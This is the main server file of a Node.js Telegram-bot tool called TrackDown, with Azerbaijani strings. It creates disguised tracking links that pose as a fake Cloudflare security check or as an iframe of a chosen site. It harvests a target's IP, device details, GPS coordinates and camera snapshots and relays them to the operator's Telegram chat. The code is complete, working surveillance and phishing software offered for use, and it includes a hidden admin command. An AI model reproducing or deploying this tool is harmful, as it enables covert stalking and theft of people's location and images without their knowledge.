/**
 * ============================================================
 *  TrackDown — Ana Server
 *  Dəstəklənən: Railway · Render · Heroku · Fly.io · Replit · VPS
 * ============================================================
 */

const config      = require('./config');
const fs          = require('fs');
const path        = require('path');
const crypto      = require('crypto');
const express     = require('express');
const cors        = require('cors');
const bp          = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

function b64Encode(str) {
  return Buffer.from(str, 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g,  '');
}

function b64Decode(str) {
  let s = str.replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.connection?.remoteAddress || req.ip || '';
}

function buildHostFromReq(req) {
  const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'https')
    .split(',')[0].trim();
  const host  = req.headers['x-forwarded-host'] || req.headers.host || '';
  return host ? `${proto}://${host}` : null;
}

function getHostURL(req) {
  if (config.STATIC_HOST) return config.STATIC_HOST;
  return buildHostFromReq(req);
}

function getMediaType() {
  const dir = path.join(__dirname, 'view');
  if (fs.existsSync(path.join(dir, 'photo.png')))   return 'photo';
  if (fs.existsSync(path.join(dir, 'video.mp4')))   return 'video';
  if (fs.existsSync(path.join(dir, 'animate.gif'))) return 'gif';
  return 'none';
}

function makeId() {
  return crypto.randomBytes(9).toString('hex');
}

function maskToken(token) {
  if (!token || token.length < 12) return '***';
  return `${token.slice(0, 6)}…${token.slice(-5)}`;
}

function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

function escapeHtml(value) {
  return String(value || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

function safeFileName(name) {
  return String(name || 'file')
    .replace(/[^a-zA-Z0-9._-]/g, '_')
    .replace(/_+/g, '_')
    .slice(0, 120);
}

let runtimeHost = config.STATIC_HOST || null;

function updateRuntimeHost(req) {
  if (runtimeHost) return;
  const url = buildHostFromReq(req);
  if (!url || url.includes('localhost') || url.includes('127.0.0.1')) return;
  runtimeHost = url;
  console.log(`🌐  Host URL avtomatik müəyyən edildi: ${runtimeHost}`);
}

const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');
const DB_FILE = path.join(DATA_DIR, 'store.json');
ensureDir(DATA_DIR);
ensureDir(UPLOAD_DIR);

function emptyStore() {
  return { files: [], bots: [], links: [] };
}

function loadStore() {
  try {
    if (!fs.existsSync(DB_FILE)) return emptyStore();
    const parsed = JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    return {
      files: Array.isArray(parsed.files) ? parsed.files : [],
      bots: Array.isArray(parsed.bots) ? parsed.bots : [],
      links: Array.isArray(parsed.links) ? parsed.links : []
    };
  } catch (err) {
    console.error('Store oxunmadı:', err.message);
    return emptyStore();
  }
}

function saveStore() {
  fs.writeFileSync(DB_FILE, JSON.stringify(store, null, 2));
}

const store = loadStore();
const sessions = new Map();
const botClients = new Map();
const USE_SHORTENER = false;

const app = express();
app.use(bp.json({ limit: '20mb', type: 'application/json' }));
app.use(bp.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'view'));
app.use('/static', express.static(path.join(__dirname, 'view')));
app.use('/uploads', express.static(UPLOAD_DIR));
app.set('trust proxy', true);
app.use((req, _res, next) => { updateRuntimeHost(req); next(); });

function findLink(id) {
  return store.links.find(link => link.id === id);
}

function linkIsActive(req) {
  const linkId = req.query.lid;
  if (!linkId) return true;
  const link = findLink(linkId);
  return !!link && link.active !== false;
}

function disabledResponse(res) {
  res.status(410).send('<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;height:100%;display:grid;place-items:center;background:#050505;color:#fff;font-family:Arial,sans-serif;text-align:center}</style></head><body><div><h2>Link deaktiv edilib</h2><p>Bu link artıq işləmir.</p></div></body></html>');
}

function renderTrack(req, res, viewName, botKey) {
  if (!linkIsActive(req)) return disabledResponse(res);
  const { uid, uri } = req.params;
  if (!uid) return res.redirect('https://t.me/th30neand0nly0ne');

  let targetUrl;
  try { targetUrl = b64Decode(uri); } catch (_) { return res.status(400).send('Yanlış link'); }

  res.render(viewName, {
    ip:        getClientIP(req),
    time:      new Date().toJSON().slice(0, 19).replace('T', ' '),
    url:       targetUrl,
    uid,
    botKey:    botKey || 'main',
    a:         getHostURL(req),
    t:         USE_SHORTENER,
    mediaType: getMediaType()
  });
}

app.get('/w/:botKey/:uid/:uri', (req, res) => renderTrack(req, res, 'webview', req.params.botKey));
app.get('/c/:botKey/:uid/:uri', (req, res) => renderTrack(req, res, 'cloudflare', req.params.botKey));
app.get('/w/:uid/:uri', (req, res) => renderTrack(req, res, 'webview', 'main'));
app.get('/c/:uid/:uri', (req, res) => renderTrack(req, res, 'cloudflare', 'main'));

app.get('/f/:id', (req, res) => {
  const file = store.files.find(item => item.id === req.params.id);
  if (!file || file.active === false) return disabledResponse(res);
  res.render('file', { file });
});

app.get('/raw/:id', (req, res) => {
  const file = store.files.find(item => item.id === req.params.id);
  if (!file || file.active === false) return disabledResponse(res);
  const fullPath = path.join(UPLOAD_DIR, file.storedName);
  if (!fs.existsSync(fullPath)) return res.status(404).send('Fayl tapılmadı');
  if (file.type === 'html') return res.type('html').send(fs.readFileSync(fullPath, 'utf8'));
  res.sendFile(fullPath);
});

app.get('/', (req, res) => {
  res.json({ status: 'TrackDown aktiv', ip: getClientIP(req) });
});

function getBotClient(botKey) {
  return botClients.get(botKey || 'main')?.bot || botClients.get('main')?.bot;
}

app.post('/', (req, res) => {
  const uid  = decodeURIComponent(req.body.uid  || '');
  const data = decodeURIComponent(req.body.data || '');
  const ip   = getClientIP(req);
  const targetBot = getBotClient(req.body.botKey || 'main');

  if (!uid || !data || !data.includes(ip)) return res.send('ok');

  targetBot?.sendMessage(parseInt(uid, 36), data.replaceAll('<br>', '\n'), { parse_mode: 'HTML' })
     .catch(() => {});
  res.send('Done');
});

app.post('/location', (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  const targetBot = getBotClient(req.body.botKey || 'main');

  if (!lat || !lon || !uid) return res.send('ok');

  const chatId = parseInt(uid, 36);
  targetBot?.sendLocation(chatId, lat, lon).catch(() => {});
  targetBot?.sendMessage(chatId, `📍 GPS Məkanı\nEnlik: ${lat}\nUzunluq: ${lon}\nDəqiqlik: ${acc} metr`).catch(() => {});
  res.send('Done');
});

app.post('/camsnap', (req, res) => {
  const uid = decodeURIComponent(req.body.uid || '');
  const img = decodeURIComponent(req.body.img || '');
  const targetBot = getBotClient(req.body.botKey || 'main');

  if (!uid || !img) return res.send('ok');

  const buffer = Buffer.from(img, 'base64');
  targetBot?.sendPhoto(parseInt(uid, 36), buffer, {}, { filename: 'camsnap.png', contentType: 'image/png' })
     .catch(err => console.error('Kamera xətası:', err.message));
  res.send('Done');
});

const bot = new TelegramBot(config.TOKEN, { polling: true });
botClients.set('main', { bot, token: config.TOKEN, title: 'Əsas bot', main: true });

function panelKeyboard() {
  return {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: 'Botlar', callback_data: 'admin:bots' }, { text: 'Fayllar', callback_data: 'admin:files' }],
        [{ text: 'Yeni Bot Əlavə Et', callback_data: 'admin:addbot' }],
        [{ text: 'Bağla', callback_data: 'admin:close' }]
      ]
    })
  };
}

function backKeyboard(extraRows = []) {
  return {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        ...extraRows,
        [{ text: 'Geri', callback_data: 'admin:open' }, { text: 'Bağla', callback_data: 'admin:close' }]
      ]
    })
  };
}

async function showPanel(botInstance, chatId, messageId) {
  const text = 'Admin panel açıldı. Aşağıdakı bölmələrdən birini seçin.';
  if (messageId) {
    return botInstance.editMessageText(text, { chat_id: chatId, message_id: messageId, ...panelKeyboard() }).catch(() => {});
  }
  return botInstance.sendMessage(chatId, text, panelKeyboard());
}

async function showBots(botInstance, chatId, messageId) {
  const rows = [[{ text: `Əsas bot · ${maskToken(config.TOKEN)}`, callback_data: 'admin:noop' }]];
  for (const item of store.bots) {
    rows.push([{ text: `${item.title || 'Bot'} · ${maskToken(item.token)}`, callback_data: `admin:bot:${item.id}` }]);
  }
  rows.push([{ text: 'Yeni Bot Əlavə Et', callback_data: 'admin:addbot' }]);
  const text = store.bots.length ? 'Bot siyahısı:' : 'Bot siyahısı: yalnız əsas bot aktivdir.';
  return botInstance.editMessageText(text, { chat_id: chatId, message_id: messageId, ...backKeyboard(rows) }).catch(() => {});
}

async function showBotActions(botInstance, chatId, messageId, botId) {
  const item = store.bots.find(entry => entry.id === botId);
  if (!item) return showBots(botInstance, chatId, messageId);
  return botInstance.editMessageText(`Bot: ${maskToken(item.token)}`, {
    chat_id: chatId,
    message_id: messageId,
    ...backKeyboard([
      [{ text: 'Edit', callback_data: `admin:botedit:${botId}` }, { text: 'Sil', callback_data: `admin:botdel:${botId}` }]
    ])
  }).catch(() => {});
}

async function showFiles(botInstance, chatId, messageId) {
  const rows = [];
  const latest = store.files.slice(-12).reverse();
  for (const item of latest) {
    const status = item.active === false ? 'deaktiv' : 'aktiv';
    rows.push([{ text: `${item.type.toUpperCase()} · ${status} · ${item.originalName || item.id}`, callback_data: 'admin:noop' }]);
    rows.push([
      { text: item.active === false ? 'Aktiv et' : 'Deaktiv et', callback_data: `admin:filetoggle:${item.id}` },
      { text: 'Sil', callback_data: `admin:filedel:${item.id}` }
    ]);
  }
  const text = latest.length ? 'Fayllar siyahısı:' : 'Hələ fayl əlavə edilməyib. Şəkil, video və ya index.html göndərin.';
  return botInstance.editMessageText(text, { chat_id: chatId, message_id: messageId, ...backKeyboard(rows) }).catch(() => {});
}

function fileTypeFromMessage(msg) {
  if (msg.photo?.length) return { type: 'image', fileId: msg.photo[msg.photo.length - 1].file_id, originalName: 'photo.jpg' };
  if (msg.video) return { type: 'video', fileId: msg.video.file_id, originalName: msg.video.file_name || 'video.mp4' };
  if (msg.document) {
    const name = msg.document.file_name || 'file';
    const lower = name.toLowerCase();
    if (lower === 'index.html' || lower.endsWith('.html') || msg.document.mime_type === 'text/html') {
      return { type: 'html', fileId: msg.document.file_id, originalName: name };
    }
    if ((msg.document.mime_type || '').startsWith('image/')) return { type: 'image', fileId: msg.document.file_id, originalName: name };
    if ((msg.document.mime_type || '').startsWith('video/')) return { type: 'video', fileId: msg.document.file_id, originalName: name };
  }
  return null;
}

function extensionFor(item) {
  const ext = path.extname(item.originalName || '').toLowerCase();
  if (ext) return ext;
  if (item.type === 'html') return '.html';
  if (item.type === 'video') return '.mp4';
  return '.jpg';
}

async function saveTelegramFile(botInstance, botKey, chatId, msg, item) {
  const id = makeId();
  const link = await botInstance.getFileLink(item.fileId);
  const response = await fetch(link);
  if (!response.ok) throw new Error('Fayl yüklənmədi');
  const buffer = await response.buffer();
  const storedName = `${id}${extensionFor(item)}`;
  fs.writeFileSync(path.join(UPLOAD_DIR, storedName), buffer);

  const fileRecord = {
    id,
    botKey,
    chatId,
    type: item.type,
    originalName: safeFileName(item.originalName),
    storedName,
    active: true,
    createdAt: new Date().toISOString()
  };
  store.files.push(fileRecord);
  saveStore();

  const host = runtimeHost;
  const url = host ? `${host}/f/${id}` : `/f/${id}`;
  await botInstance.sendMessage(chatId, `✅ Fayl əlavə olundu\n${url}`, {
    reply_markup: JSON.stringify({
      inline_keyboard: [[{ text: 'Deaktiv et', callback_data: `filedeact:${id}` }]]
    })
  });
}

async function addExtraBot(token, title) {
  const id = makeId();
  const instance = new TelegramBot(token, { polling: true });
  botClients.set(id, { bot: instance, token, title: title || 'Əlavə bot', main: false });
  attachBotHandlers(instance, id);
  store.bots.push({ id, token, title: title || 'Əlavə bot', createdAt: new Date().toISOString() });
  saveStore();
  return id;
}

async function replaceExtraBot(botId, token) {
  const current = botClients.get(botId);
  if (current?.bot) await current.bot.stopPolling().catch(() => {});
  const instance = new TelegramBot(token, { polling: true });
  botClients.set(botId, { bot: instance, token, title: 'Əlavə bot', main: false });
  attachBotHandlers(instance, botId);
  const item = store.bots.find(entry => entry.id === botId);
  if (item) item.token = token;
  saveStore();
}

async function deleteExtraBot(botId) {
  const current = botClients.get(botId);
  if (current?.bot) await current.bot.stopPolling().catch(() => {});
  botClients.delete(botId);
  store.bots = store.bots.filter(entry => entry.id !== botId);
  saveStore();
}

async function handleSession(botInstance, botKey, msg, session) {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (session.action === 'addbot') {
    sessions.delete(chatId);
    if (!/^\d+:[A-Za-z0-9_-]{20,}$/.test(text)) return botInstance.sendMessage(chatId, 'Token formatı yanlışdır.');
    try {
      await addExtraBot(text, 'Əlavə bot');
      return botInstance.sendMessage(chatId, '✅ Yeni bot əlavə edildi və dərhal aktiv oldu.');
    } catch (_) {
      return botInstance.sendMessage(chatId, 'Token qəbul edilmədi və ya bot işə düşmədi.');
    }
  }
  if (session.action === 'editbot') {
    sessions.delete(chatId);
    if (!/^\d+:[A-Za-z0-9_-]{20,}$/.test(text)) return botInstance.sendMessage(chatId, 'Token formatı yanlışdır.');
    try {
      await replaceExtraBot(session.botId, text);
      return botInstance.sendMessage(chatId, '✅ Bot yeniləndi və dərhal aktiv oldu.');
    } catch (_) {
      return botInstance.sendMessage(chatId, 'Token qəbul edilmədi və ya bot işə düşmədi.');
    }
  }
}

async function handleMessage(botInstance, botKey, msg) {
  const chatId = msg.chat.id;
  const session = sessions.get(chatId);
  if (session && msg.text) return handleSession(botInstance, botKey, msg, session);

  const upload = fileTypeFromMessage(msg);
  if (upload) {
    try {
      await saveTelegramFile(botInstance, botKey, chatId, msg, upload);
    } catch (err) {
      await botInstance.sendMessage(chatId, `Fayl əlavə olunmadı: ${err.message}`);
    }
    return;
  }

  if (msg?.reply_to_message?.text === '🌐 Enter Your URL') {
    return createLink(botInstance, botKey, chatId, msg.text || '');
  }

  switch (msg.text) {
    case '/start': {
      const caption =
        `◈ 𝐓𝐇𝐄 𝐋𝐈𝐅𝐄 𝐈𝐒 𝐍𝐎𝐓 𝐅𝐀𝐈𝐑 ◈\n` +
        `◈ 𝐘𝐎𝐔 𝐒𝐇𝐎𝐔𝐋𝐃 𝐍𝐎𝐓 𝐁𝐄 𝐀 𝐅𝐀𝐈𝐑 ◈\n` +
        `▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n` +
        `⚓ 𝘽𝙤𝙩 𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝙗𝙮 𝙊𝙍𝙐𝙅𝙊𝙑 ⚓\n\n` +
        `Başlamaq üçün /create yazın.`;

      const markup = {
        reply_markup: JSON.stringify({
          inline_keyboard: [[{ text: '🔗 Link Yarat', callback_data: 'crenew' }]]
        })
      };

      const imgPath = path.join(__dirname, 'bot', 'bot.png');
      if (fs.existsSync(imgPath)) {
        botInstance.sendPhoto(chatId, imgPath, { caption, ...markup });
      } else {
        botInstance.sendMessage(chatId, `Xoş gəldiniz, ${msg.chat.first_name}!\n\n${caption}`, markup);
      }
      break;
    }

    case '/create':
      createNew(botInstance, chatId);
      break;

    case '/66':
      showPanel(botInstance, chatId);
      break;

    case '/help':
      botInstance.sendMessage(chatId,
        `ℹ️ *TrackDown — Yardım*\n\n` +
        `Bu bot izləmə linki yaratmağa kömək edir.\n\n` +
        `*Addımlar:*\n` +
        `1️⃣ /create yazın\n` +
        `2️⃣ Hədəfə göstərmək istədiyiniz URL-i göndərin\n` +
        `3️⃣ 2 izləmə linki alacaqsınız\n\n` +
        `*Link növləri:*\n` +
        `🔵 *Cloudflare* — Saxta təhlükəsizlik yoxlama ekranı\n` +
        `🟢 *Webview* — Seçdiyiniz saytı iframe ilə göstərir\n\n` +
        `*Toplanan məlumatlar:*\n` +
        `• IP ünvanı və ISP\n` +
        `• Cihaz / brauzer məlumatları\n` +
        `• GPS koordinatları (icazə verilsə)\n` +
        `• Kamera şəkli (icazə verilsə)`,
        { parse_mode: 'Markdown' }
      );
      break;
  }
}

async function handleCallback(botInstance, botKey, cbq) {
  const chatId = cbq.message?.chat?.id;
  const messageId = cbq.message?.message_id;
  const data = cbq.data || '';
  botInstance.answerCallbackQuery(cbq.id).catch(() => {});
  if (!chatId) return;

  if (data === 'crenew') return createNew(botInstance, chatId);
  if (data === 'admin:open') return showPanel(botInstance, chatId, messageId);
  if (data === 'admin:bots') return showBots(botInstance, chatId, messageId);
  if (data === 'admin:files') return showFiles(botInstance, chatId, messageId);
  if (data === 'admin:close') return botInstance.deleteMessage(chatId, messageId).catch(() => {});
  if (data === 'admin:addbot') {
    sessions.set(chatId, { action: 'addbot' });
    return botInstance.sendMessage(chatId, 'Yeni bot tokenini göndərin.', { reply_markup: JSON.stringify({ force_reply: true }) });
  }
  if (data.startsWith('admin:bot:')) return showBotActions(botInstance, chatId, messageId, data.split(':')[2]);
  if (data.startsWith('admin:botdel:')) {
    await deleteExtraBot(data.split(':')[2]);
    return showBots(botInstance, chatId, messageId);
  }
  if (data.startsWith('admin:botedit:')) {
    sessions.set(chatId, { action: 'editbot', botId: data.split(':')[2] });
    return botInstance.sendMessage(chatId, 'Yeni tokeni göndərin.', { reply_markup: JSON.stringify({ force_reply: true }) });
  }
  if (data.startsWith('admin:filetoggle:')) {
    const item = store.files.find(file => file.id === data.split(':')[2]);
    if (item) {
      item.active = item.active === false;
      saveStore();
    }
    return showFiles(botInstance, chatId, messageId);
  }
  if (data.startsWith('admin:filedel:')) {
    const id = data.split(':')[2];
    const item = store.files.find(file => file.id === id);
    if (item) {
      const fullPath = path.join(UPLOAD_DIR, item.storedName);
      if (fs.existsSync(fullPath)) fs.unlinkSync(fullPath);
      store.files = store.files.filter(file => file.id !== id);
      saveStore();
    }
    return showFiles(botInstance, chatId, messageId);
  }
  if (data.startsWith('filedeact:')) {
    const item = store.files.find(file => file.id === data.split(':')[1]);
    if (item) {
      item.active = false;
      saveStore();
      return botInstance.sendMessage(chatId, '✅ Fayl linki deaktiv edildi.');
    }
  }
  if (data.startsWith('deactlink:')) {
    const item = findLink(data.split(':')[1]);
    if (item) {
      item.active = false;
      saveStore();
      return botInstance.sendMessage(chatId, '✅ Link deaktiv edildi və artıq işləməyəcək.');
    }
  }
}

function attachBotHandlers(botInstance, botKey) {
  botInstance.on('message', (msg) => handleMessage(botInstance, botKey, msg).catch(err => console.error('Bot mesaj xətası:', err.message)));
  botInstance.on('callback_query', (cbq) => handleCallback(botInstance, botKey, cbq).catch(err => console.error('Callback xətası:', err.message)));
  botInstance.on('polling_error', (err) => {
    if (err.code === 'ETELEGRAM' && err.message.includes('409')) return;
    console.error(`❌ Telegram xətası: [${err.code}] ${err.message}`);
  });
}

function createNew(botInstance, cid) {
  botInstance.sendMessage(cid, '🌐 Enter Your URL', {
    reply_markup: JSON.stringify({ force_reply: true })
  });
}

async function createLink(botInstance, botKey, cid, text) {
  const isURL     = /^https?:\/\/.+/i.test((text || '').trim());
  const hasUnicode = [...(text || '')].some(c => c.charCodeAt(0) > 127);

  if (!isURL || hasUnicode) {
    await botInstance.sendMessage(cid, '⚠️ Zəhmət olmasa https:// ilə başlayan düzgün URL göndərin.');
    return createNew(botInstance, cid);
  }

  const host = runtimeHost;
  if (!host) {
    return botInstance.sendMessage(cid,
      '⚠️ *Host URL hələ müəyyən edilməyib.*\n\n' +
      'Həll yolu:\n' +
      '`bot.js` faylında domain sahəsini doldurun:\n' +
      '`domain: "https://sizin-site.com"`\n\n' +
      'Dəyişiklikdən sonra serveri yenidən başladın.',
      { parse_mode: 'Markdown' }
    );
  }

  const uid  = cid.toString(36);
  const enc  = b64Encode(text.trim());
  const linkId = makeId();
  store.links.push({ id: linkId, botKey, chatId: cid, url: text.trim(), active: true, createdAt: new Date().toISOString() });
  saveStore();

  const cPath = botKey === 'main' ? `/c/${uid}/${enc}` : `/c/${botKey}/${uid}/${enc}`;
  const wPath = botKey === 'main' ? `/w/${uid}/${enc}` : `/w/${botKey}/${uid}/${enc}`;
  const cUrl = `${host}${cPath}?lid=${linkId}`;
  const wUrl = `${host}${wPath}?lid=${linkId}`;

  const markup = {
    reply_markup: JSON.stringify({
      inline_keyboard: [
        [{ text: 'Deaktiv et', callback_data: `deactlink:${linkId}` }],
        [{ text: '🔗 Yeni Link Yarat', callback_data: 'crenew' }]
      ]
    })
  };

  botInstance.sendChatAction(cid, 'typing');

  if (USE_SHORTENER) {
    try {
      const [rx, ry] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(r => r.json()),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(r => r.json())
      ]);
      return botInstance.sendMessage(cid,
        `✅ *Linklər hazırdır!*\n🔗 URL: ${text}\n\n` +
        `🔵 *Cloudflare*\n${Object.values(rx).join('\n')}\n\n` +
        `🟢 *Webview*\n${Object.values(ry).join('\n')}`,
        { parse_mode: 'Markdown', ...markup }
      );
    } catch (_) {}
  }

  botInstance.sendMessage(cid,
    `✅ *Linklər hazırdır!*\n` +
    `🔗 URL: ${text}\n\n` +
    `🔵 *Cloudflare Link*\n${cUrl}\n\n` +
    `🟢 *Webview Link*\n${wUrl}`,
    { parse_mode: 'Markdown', ...markup }
  );
}

attachBotHandlers(bot, 'main');

for (const item of store.bots) {
  try {
    const instance = new TelegramBot(item.token, { polling: true });
    botClients.set(item.id, { bot: instance, token: item.token, title: item.title || 'Əlavə bot', main: false });
    attachBotHandlers(instance, item.id);
  } catch (err) {
    console.error('Əlavə bot başlamadı:', err.message);
  }
}

app.listen(config.PORT, () => {
  console.log(`🚀  Server işləyir — Port: ${config.PORT}`);
});
